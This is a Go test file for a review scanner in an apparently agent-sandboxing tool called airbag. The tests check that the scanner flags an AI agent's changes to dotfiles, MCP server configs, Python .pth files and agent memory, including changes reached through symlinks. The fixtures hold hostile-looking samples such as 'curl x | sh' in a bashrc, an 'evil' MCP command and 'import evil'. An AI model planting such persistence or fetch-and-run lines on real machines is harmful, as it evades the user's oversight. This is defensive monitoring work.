package review

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"syscall"
	"testing"

	"golang.org/x/sys/unix"

	"github.com/getjump/airbag/internal/session"
)

func symlink(t *testing.T, target, link string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(link), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
}

// Dotfiles kept as links into ~/dotfiles: the agent's write through a
// link lands on its target, which is classified as the path it stands
// for.
func TestDotfileLinksAreClassified(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/bashrc"), "# rc\n")
	symlink(t, "dotfiles/bashrc", filepath.Join(h, ".bashrc"))
	writeCfg(t, filepath.Join(h, "dotfiles/claude/shell-snapshots/snap-1.sh"), "export PATH=/usr/bin\n")
	writeCfg(t, filepath.Join(h, "dotfiles/claude/projects/-x/memory/M.md"), "remember\n")
	symlink(t, "dotfiles/claude", filepath.Join(h, ".claude"))
	// One snapshot linked on its own, as a dotfiles manager may.
	writeCfg(t, filepath.Join(h, "dotfiles/snap-2.sh"), "export PATH=/usr/bin\n")
	symlink(t, "../../snap-2.sh", filepath.Join(h, "dotfiles/claude/shell-snapshots/snap-2.sh"))

	want := map[string]string{
		"dotfiles/bashrc":                           "persist",
		"dotfiles/claude/settings.json":             "persist",
		"dotfiles/claude/shell-snapshots/snap-1.sh": shellStateFlag,
		"dotfiles/snap-2.sh":                        shellStateFlag,
		"dotfiles/claude/projects/-x/memory/M.md":   "agent instructions",
		"dotfiles/notes.txt":                        "",
	}
	for rel := range want {
		writeCfg(t, filepath.Join(s.HomeUpper(), rel), "changed by the agent\n")
	}
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string][]string{}
	for _, c := range cs {
		got[c.Rel] = c.Flags
	}
	for rel, flag := range want {
		fl, ok := got[rel]
		if !ok {
			t.Errorf("%s: no change", rel)
			continue
		}
		if flag == "" {
			if len(withoutOutside(fl)) != 0 {
				t.Errorf("%s: flags %v, want none", rel, fl)
			}
		} else if !slices.Contains(fl, flag) {
			t.Errorf("%s: flags %v, want %q", rel, fl, flag)
		}
	}
}

func TestResolveInHome(t *testing.T) {
	root := t.TempDir()
	home := filepath.Join(root, "home")
	writeCfg(t, filepath.Join(home, "dotfiles/rc"), "")
	symlink(t, "dotfiles/rc", filepath.Join(home, ".rc"))
	symlink(t, "dotfiles", filepath.Join(home, ".dir"))
	if err := os.MkdirAll(filepath.Join(root, "outside"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, filepath.Join(root, "outside"), filepath.Join(home, ".out"))
	// $HOME itself reached through a link.
	link := filepath.Join(root, "homelink")
	symlink(t, "home", link)
	for _, h := range []string{home, link} {
		for rel, want := range map[string]string{
			".rc":           filepath.Join(h, "dotfiles/rc"),
			".dir/new/file": filepath.Join(h, "dotfiles/new/file"),
			".out/x":        "",
			"plain":         "",
			"dotfiles/rc":   "",
		} {
			got, ok := resolveInHome(h, rel)
			if want == "" && ok || want != "" && (!ok || got != want) {
				t.Errorf("home %s, %s: %q %v, want %q", h, rel, got, ok, want)
			}
		}
	}
}

// The workspace is the dotfiles repository the home links point into:
// the agent's edit of a file there is the linked dotfile.
func TestDotfilesRepoAsWorkspace(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home, ws := t.TempDir(), t.TempDir()
	writeCfg(t, filepath.Join(ws, "bashrc"), "# rc\n")
	writeCfg(t, filepath.Join(ws, "claude.json"), `{"numStartups":1}`)
	writeCfg(t, filepath.Join(ws, "notes.md"), "notes\n")
	symlink(t, filepath.Join(ws, "bashrc"), filepath.Join(home, ".bashrc"))
	symlink(t, filepath.Join(ws, "claude.json"), filepath.Join(home, ".claude.json"))
	for _, d := range []string{ws, home} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), "bashrc"), "# rc\ncurl x | sh\n")
	writeCfg(t, filepath.Join(s.WSUpper(), "claude.json"), `{"numStartups":2,"mcpServers":{"x":{"command":"evil"}}}`)
	writeCfg(t, filepath.Join(s.WSUpper(), "notes.md"), "more notes\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]Change{}
	for _, c := range cs {
		got[c.Rel] = c
	}
	if !slices.Contains(got["bashrc"].Flags, "persist") {
		t.Errorf("bashrc: flags %v", got["bashrc"].Flags)
	}
	cj := got["claude.json"]
	if !slices.Contains(cj.Flags, "persist key(s): mcpServers") {
		t.Errorf("claude.json: flags %v", cj.Flags)
	}
	if d := diffOf(cj); strings.Contains(d, "evil") {
		t.Errorf("claude.json: diff printed a value: %q", d)
	}
	if len(got["notes.md"].Flags) != 0 {
		t.Errorf("notes.md: flags %v", got["notes.md"].Flags)
	}
}

// A link deep in a watched tree, one whose target does not exist yet, a
// linked memory directory, and a watched name linked to $HOME itself
// (which would stand for everything, so it stands for nothing).
func TestLinkedPathsBelowAndDangling(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/init.lua"), "-- x\n")
	symlink(t, filepath.Join(h, "dotfiles/init.lua"), filepath.Join(h, ".config/nvim/lua/plugin/init.lua"))
	symlink(t, "dotfiles/zshrc", filepath.Join(h, ".zshrc")) // dangling
	writeCfg(t, filepath.Join(h, "dotfiles/mem/M.md"), "remember\n")
	writeCfg(t, filepath.Join(h, ".claude/projects/-x/t.jsonl"), "{}\n")
	symlink(t, filepath.Join(h, "dotfiles/mem"), filepath.Join(h, ".claude/projects/-x/memory"))
	symlink(t, ".", filepath.Join(h, ".gemini"))
	want := map[string]string{
		"dotfiles/init.lua": "persist",
		"dotfiles/zshrc":    "persist",
		"dotfiles/mem/M.md": "agent instructions",
		"notes.txt":         "",
	}
	for rel := range want {
		writeCfg(t, filepath.Join(s.HomeUpper(), rel), "changed by the agent\n")
	}
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string][]string{}
	for _, c := range cs {
		got[c.Rel] = c.Flags
	}
	for rel, flag := range want {
		fl := got[rel]
		if flag == "" && len(withoutOutside(fl)) != 0 || flag != "" && !slices.Contains(fl, flag) {
			t.Errorf("%s: flags %v, want %q", rel, fl, flag)
		}
	}
}

// Working on a config's own repository: ~/.config/nvim links to the
// workspace root, so every change there is that config.
func TestWatchedDirLinkedToWorkspaceRoot(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home := t.TempDir()
	ws := filepath.Join(home, "nvimcfg")
	writeCfg(t, filepath.Join(ws, "init.lua"), "-- x\n")
	symlink(t, "../nvimcfg", filepath.Join(home, ".config/nvim"))
	for _, d := range []string{ws, home} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), "init.lua"), "-- changed\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "init.lua" && !slices.Contains(c.Flags, "persist") {
			t.Errorf("init.lua: flags %v", c.Flags)
		}
	}
}

// A path inside both roots is spelled under the most specific one, as
// the change there is found.
func TestUnderMostSpecificRoot(t *testing.T) {
	root := t.TempDir()
	real := filepath.Join(root, "real-home")
	if err := os.MkdirAll(filepath.Join(real, "ws"), 0o700); err != nil {
		t.Fatal(err)
	}
	home := filepath.Join(root, "home") // $HOME through a link
	symlink(t, "real-home", home)
	ws := filepath.Join(real, "ws") // the workspace's physical path
	got, ok := under(filepath.Join(real, "ws", "bashrc"), []string{home, ws})
	if !ok || got != filepath.Join(ws, "bashrc") {
		t.Errorf("under = %q %v, want the workspace's spelling", got, ok)
	}
	// A target spelled through a link (a link's text naming /var for
	// /private/var on macOS) is found under its root too.
	got, ok = under(filepath.Join(home, "ws", "bashrc"), []string{home, ws})
	if !ok || got != filepath.Join(ws, "bashrc") {
		t.Errorf("under via a link = %q %v, want the workspace's spelling", got, ok)
	}
}

// A relative dangling link below a linked directory is read from the
// directory the link really is in.
func TestDanglingLinkBelowLinkedDir(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	if err := os.MkdirAll(filepath.Join(h, "dotfiles/config"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, "dotfiles/config", filepath.Join(h, ".config"))
	symlink(t, "../fish-src", filepath.Join(h, "dotfiles/config/fish")) // nothing there yet
	writeCfg(t, filepath.Join(s.HomeUpper(), "dotfiles/fish-src/config.fish"), "set -x PATH /tmp $PATH\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "dotfiles/fish-src/config.fish" {
			if !slices.Contains(c.Flags, "persist") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// A linked directory inside a watched tree whose target holds links of
// its own: those are found too, under the name they stand for.
func TestNestedLinkChain(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/shared/init.lua"), "-- x\n")
	if err := os.MkdirAll(filepath.Join(h, ".config/nvim"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, filepath.Join(h, "dotfiles/nvim-lua"), filepath.Join(h, ".config/nvim/lua"))
	symlink(t, filepath.Join(h, "dotfiles/shared/init.lua"), filepath.Join(h, "dotfiles/nvim-lua/plugin/init.lua"))
	// A loop of linked directories ends.
	symlink(t, filepath.Join(h, "dotfiles/nvim-lua"), filepath.Join(h, "dotfiles/nvim-lua/again"))
	writeCfg(t, filepath.Join(s.HomeUpper(), "dotfiles/shared/init.lua"), "-- changed\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "dotfiles/shared/init.lua" {
			if !slices.Contains(c.Flags, "persist") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// The prefix of a wildcard pattern is no whole tree: a .pth file linked
// to another place under .local/lib is found by the link's name.
func TestLinkInsideWildcardPrefix(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, ".local/lib/shared/x.pth"), "import os\n")
	symlink(t, "../../shared/x.pth", filepath.Join(h, ".local/lib/python3.12/site-packages/x.pth"))
	writeCfg(t, filepath.Join(s.HomeUpper(), ".local/lib/shared/x.pth"), "import evil\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == ".local/lib/shared/x.pth" {
			if !slices.Contains(c.Flags, "persist") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// Deleting ~/.claude/projects while a project directory in it is a link
// to one holding memory removes instructions too.
func TestHoldsMemoryThroughLinkedProject(t *testing.T) {
	home := t.TempDir()
	writeCfg(t, filepath.Join(home, "dotfiles/proj/memory/M.md"), "remember\n")
	symlink(t, filepath.Join(home, "dotfiles/proj"), filepath.Join(home, ".claude/projects/-x"))
	for _, rel := range []string{".claude", ".claude/projects"} {
		if !holdsMemory(filepath.Join(home, rel), rel) {
			t.Errorf("%s: linked project's memory not found", rel)
		}
	}
}

// In a wildcard prefix's tree, a directory linked to another place in
// the same tree is walked under the link's name, so a link inside it
// keeps the name the pattern matches.
func TestInTreeLinkedDirUnderWildcardPrefix(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/x.pth"), "import os\n")
	if err := os.MkdirAll(filepath.Join(h, ".local/lib/shared/site-packages"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, "shared", filepath.Join(h, ".local/lib/python3"))
	symlink(t, filepath.Join(h, "dotfiles/x.pth"), filepath.Join(h, ".local/lib/shared/site-packages/x.pth"))
	writeCfg(t, filepath.Join(s.HomeUpper(), "dotfiles/x.pth"), "import evil\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "dotfiles/x.pth" {
			if !slices.Contains(c.Flags, "persist") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// A workspace's git internals take no alias names: a linked dotfile's
// repository objects are not the dotfile.
func TestWorkspaceGitTakesNoAlias(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home, ws := t.TempDir(), t.TempDir()
	symlink(t, ws, filepath.Join(home, "bin"))
	for _, d := range []string{ws, home} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), ".git/objects/ab/cdef"), "blob\n")
	writeCfg(t, filepath.Join(s.WSUpper(), "tool"), "#!/bin/sh\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string][]string{}
	for _, c := range cs {
		got[c.Rel] = c.Flags
	}
	if slices.Contains(got[".git/objects/ab/cdef"], "persist") {
		t.Errorf(".git object flagged: %v", got[".git/objects/ab/cdef"])
	}
	if !slices.Contains(got["tool"], "persist") {
		t.Errorf("a file in the linked ~/bin: %v", got["tool"])
	}
}

// Two links to one directory each name its contents: the second is not
// skipped as walked already, and the name the pattern matches is found
// whichever link comes first.
func TestTwoLinksToOneDir(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	writeCfg(t, filepath.Join(h, "dotfiles/x.pth"), "import os\n")
	if err := os.MkdirAll(filepath.Join(h, ".local/lib/shared/site-packages"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, "shared", filepath.Join(h, ".local/lib/current"))
	symlink(t, "shared", filepath.Join(h, ".local/lib/python3"))
	symlink(t, filepath.Join(h, "dotfiles/x.pth"), filepath.Join(h, ".local/lib/shared/site-packages/x.pth"))
	writeCfg(t, filepath.Join(s.HomeUpper(), "dotfiles/x.pth"), "import evil\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "dotfiles/x.pth" {
			if !slices.Contains(c.Flags, "persist") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// A host snapshot linked to another name in the same directory is
// sourced through the link: the agent's new file at the link's target is
// the host's snapshot, though no snapshot had that name.
func TestSnapshotLinkedWithinSnapshots(t *testing.T) {
	s, _, _ := cfgSession(t)
	h := s.Home
	if err := os.MkdirAll(filepath.Join(h, ".claude/shell-snapshots"), 0o700); err != nil {
		t.Fatal(err)
	}
	symlink(t, "snap-B.sh", filepath.Join(h, ".claude/shell-snapshots/snap-A.sh"))
	writeCfg(t, filepath.Join(s.HomeUpper(), ".claude/shell-snapshots/snap-B.sh"), "export PATH=/tmp/x:/usr/bin\n")
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == ".claude/shell-snapshots/snap-B.sh" {
			if !slices.Contains(c.Flags, shellStateFlag) {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// A legacy config linked into the workspace that the agent creates is
// read instead of the existing ~/.claude.json: the check for that looks
// in $HOME, not in the workspace the change is in.
func TestShadowingConfigLinkedIntoWorkspace(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home, ws := t.TempDir(), t.TempDir()
	writeCfg(t, filepath.Join(home, ".claude.json"), `{"numStartups":1}`)
	symlink(t, filepath.Join(ws, "legacy.json"), filepath.Join(home, ".claude/.config.json"))
	for _, d := range []string{ws, home} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), "legacy.json"), `{"numStartups":2}`)
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == "legacy.json" {
			if !slices.Contains(c.Flags, "new, read instead of ~/.claude.json") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// A change above where a watched path really is moves it: replacing
// ~/dotfiles/project with a link points the project's memory elsewhere,
// replacing it with a file or deleting ~/dotfiles takes it away.
func TestChangeAboveAliasTarget(t *testing.T) {
	for _, tc := range []struct {
		name, at string
		make     func(t *testing.T, path string)
		want     []string
	}{
		{"link", "dotfiles/project", func(t *testing.T, p string) { symlink(t, "/tmp/elsewhere", p) }, []string{"persist", "agent instructions"}},
		{"file", "dotfiles/project", func(t *testing.T, p string) { writeCfg(t, p, "not a directory\n") }, []string{"persist", "agent instructions"}},
		{"deleted", "dotfiles", func(t *testing.T, p string) {
			if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := unix.Mknod(p, syscall.S_IFCHR, 0); err != nil {
				t.Skipf("cannot create a whiteout here: %v", err)
			}
		}, []string{"persist", "agent instructions"}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s, _, _ := cfgSession(t)
			h := s.Home
			writeCfg(t, filepath.Join(h, "dotfiles/project/memory/MEMORY.md"), "notes\n")
			writeCfg(t, filepath.Join(h, "dotfiles/bashrc"), "# rc\n")
			symlink(t, filepath.Join(h, "dotfiles/project/memory"), filepath.Join(h, ".claude/projects/x/memory"))
			symlink(t, filepath.Join(h, "dotfiles/bashrc"), filepath.Join(h, ".bashrc"))
			tc.make(t, filepath.Join(s.HomeUpper(), tc.at))
			cs, err := Scan(s)
			if err != nil {
				t.Fatal(err)
			}
			for _, c := range cs {
				if c.Rel == tc.at {
					for _, f := range tc.want {
						if !slices.Contains(c.Flags, f) {
							t.Errorf("flags %v lack %q", c.Flags, f)
						}
					}
					return
				}
			}
			t.Fatalf("no change at %s in %+v", tc.at, cs)
		})
	}
}

// A config linked to a file inside the workspace's .git is still the
// config: git internals drop only the names of linked directories
// above them.
func TestConfigLinkedIntoWorkspaceGit(t *testing.T) {
	t.Setenv("AIRBAG_HOME", t.TempDir())
	home, ws := t.TempDir(), t.TempDir()
	writeCfg(t, filepath.Join(ws, ".git/claude.json"), `{"numStartups":1}`)
	symlink(t, filepath.Join(ws, ".git/claude.json"), filepath.Join(home, ".claude.json"))
	for _, d := range []string{ws, home} {
		if err := os.MkdirAll(d, 0o755); err != nil {
			t.Fatal(err)
		}
	}
	s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
	if err != nil {
		t.Fatal(err)
	}
	writeCfg(t, filepath.Join(s.WSUpper(), ".git/claude.json"), `{"numStartups":1,"mcpServers":{"x":{"command":"evil"}}}`)
	cs, err := Scan(s)
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range cs {
		if c.Rel == ".git/claude.json" {
			if !slices.Contains(c.Flags, "persist key(s): mcpServers") {
				t.Errorf("flags %v", c.Flags)
			}
			return
		}
	}
	t.Fatalf("no change in %+v", cs)
}

// Inside .git, a watched directory linked there names what is added in
// it, and a change above a watched path's real place there moves it.
func TestWatchedPathsInsideWorkspaceGit(t *testing.T) {
	for _, tc := range []struct {
		name, rel string
		make      func(t *testing.T, s *session.Session)
		want      string
	}{
		{"dir", ".git/nvim/init.lua", func(t *testing.T, s *session.Session) {
			writeCfg(t, filepath.Join(s.WSUpper(), ".git/nvim/init.lua"), "vim.cmd('!id')\n")
		}, "persist"},
		{"above", ".git/airbag", func(t *testing.T, s *session.Session) {
			p := filepath.Join(s.WSUpper(), ".git/airbag")
			if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := unix.Mknod(p, syscall.S_IFCHR, 0); err != nil {
				t.Skipf("cannot create a whiteout here: %v", err)
			}
		}, "persist"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("AIRBAG_HOME", t.TempDir())
			home, ws := t.TempDir(), t.TempDir()
			writeCfg(t, filepath.Join(ws, ".git/nvim/init.lua"), "-- rc\n")
			writeCfg(t, filepath.Join(ws, ".git/airbag/claude.json"), `{"numStartups":1}`)
			symlink(t, filepath.Join(ws, ".git/nvim"), filepath.Join(home, ".config/nvim"))
			symlink(t, filepath.Join(ws, ".git/airbag/claude.json"), filepath.Join(home, ".claude.json"))
			for _, d := range []string{ws, home} {
				if err := os.MkdirAll(d, 0o755); err != nil {
					t.Fatal(err)
				}
			}
			s, err := session.Create(session.Meta{Workspace: ws, Home: home, OverHome: true})
			if err != nil {
				t.Fatal(err)
			}
			tc.make(t, s)
			cs, err := Scan(s)
			if err != nil {
				t.Fatal(err)
			}
			for _, c := range cs {
				if c.Rel == tc.rel {
					if !slices.Contains(c.Flags, tc.want) {
						t.Errorf("flags %v", c.Flags)
					}
					return
				}
			}
			t.Fatalf("no change at %s in %+v", tc.rel, cs)
		})
	}
}

// A link the agent puts where a project's directory, projects/ or
// ~/.claude is points the memory later sessions load at whatever it
// names.
func TestLinkAboveMemoryFlagged(t *testing.T) {
	for _, rel := range []string{".claude/projects/new-slug", ".claude/projects/x", ".claude/projects"} {
		t.Run(rel, func(t *testing.T) {
			s, _, _ := cfgSession(t)
			writeCfg(t, filepath.Join(s.Home, ".claude/projects/x/memory/MEMORY.md"), "notes\n")
			writeCfg(t, filepath.Join(s.Home, "elsewhere/memory/MEMORY.md"), "run the server\n")
			if err := os.MkdirAll(filepath.Join(s.HomeUpper(), filepath.Dir(rel)), 0o700); err != nil {
				t.Fatal(err)
			}
			symlink(t, filepath.Join(s.Home, "elsewhere"), filepath.Join(s.HomeUpper(), rel))
			cs, err := Scan(s)
			if err != nil {
				t.Fatal(err)
			}
			for _, c := range cs {
				if c.Rel == rel {
					if !slices.Contains(c.Flags, "agent instructions") {
						t.Errorf("flags %v", c.Flags)
					}
					return
				}
			}
			t.Fatalf("no change at %s in %+v", rel, cs)
		})
	}
	for rel, want := range map[string]bool{".claude": true, ".claude/projects": true, ".claude/projects/x": true,
		".claude/projects/x/memory": false, ".claude/settings.json": false, ".codex": false} {
		if aboveMemory(rel) != want {
			t.Errorf("aboveMemory(%q) = %v", rel, !want)
		}
	}
}
